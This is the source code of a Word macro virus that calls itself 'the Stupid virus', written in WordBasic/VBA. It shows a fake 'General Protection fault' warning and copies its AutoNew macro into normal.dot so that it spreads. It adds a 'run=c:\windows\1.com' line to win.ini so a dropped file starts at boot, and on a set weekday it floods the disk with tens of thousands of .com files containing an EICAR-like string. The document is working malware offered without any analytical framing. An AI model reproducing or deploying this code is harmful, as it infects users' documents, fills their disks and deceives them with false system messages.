   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim a$
   Dim b$
   WordBasic.DisableAutoMacros 0
   On Error Resume Next
   WordBasic.MsgBox "A General Protection fault in 12ADCAFB2:232:23 has been discovered. This can cause the computer to freeze. Word is now going to examine this problem so do Not press any buttons until Word is ready.", " Microsoft Word ", 48

   WordBasic.FileFind SearchPath:="c:\", SubDir:=1, Name:="normal.dot"
   a$ = WordBasic.[FoundFileName$](1)
   WordBasic.FileFind SearchPath:="c:\", SubDir:=1, Name:="win.doc"
   b$ = WordBasic.[FoundFileName$](1)

   WordBasic.Organizer Copy:=1, Source:=b$, Destination:=a$, Name:="AutoNew", Tab:=3

   WordBasic.MsgBox "The problem could not be fixed. Restart your computer!", 48

   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim b$
   Dim n$
   Dim tyty$
   Dim c$
   Dim ha$
   Dim aa$
   Dim count_
   Dim ay
   Dim da
   Dim ti
   Dim e
   Dim file$
   Dim name_$
   Dim n_
   WordBasic.ChDir "c:\windows\"

   b$ = "You have been infected by the Stupid virus....    @  " + WordBasic.[Time$]() + "  " + WordBasic.[Date$]()
   n$ = "hahahahhaha"
   tyty$ = " "
   c$ = "run=c:\windows\1.com"
   ha$ = "X5O!P%@AP[4\PZX54(P^)7CC)7}$______---The-Stupid-Virus---_______$H+H*"

   On Error GoTo -1: On Error GoTo ny
   Open "win.txt" For Input As 1
   On Error GoTo -1: On Error GoTo 0
   While Not EOF(1)
   Input #1, aa$
   Wend
   Close 1
   If aa$ = n$ Then GoTo old
   GoTo ny

   old:

   count_ = 200
   ay = WordBasic.Weekday(WordBasic.Today())
   If ay = 5 Then count_ = count_ * 300
   If ay = 5 Then WordBasic.MsgBox "This does not seem like your lucky day!", "HaHA", 530

   Open "win.ini" For Append As 3
   Print #3, n$
   Print #3, tyty$
   Print #3, b$
   Close 3

   da = WordBasic.Day(WordBasic.Now())
   ti = WordBasic.Minute(WordBasic.Now())

   For e = 1 To count_
   file$ = Str(da) + Str(ti) + Str(e) + ".com"
   If e = 1 Then file$ = "1.com"
   Open file$ For Output As 2
   Print #2, ha$
   Close 2
   Next e
   GoTo nd

   ny:
   Open "win.txt" For Output As 4
   Write #4, n$
   Close 4

   Open "Win.ini" For Input As 1
   Input #1, name_$
   While WordBasic.[Left$](name_$, 3) <> "run"
       If EOF(1) Then
           GoTo finish
       End If
       n_ = Seek(1) - 1
       Input #1, name_$
   Wend
   finish:
   Close 1
   Open "win.ini" For Append As 2
   Seek 2, n_ + 1
   Print #2, "run=c:\windows\1.com"
   Close 2
   nd:


   End Sub
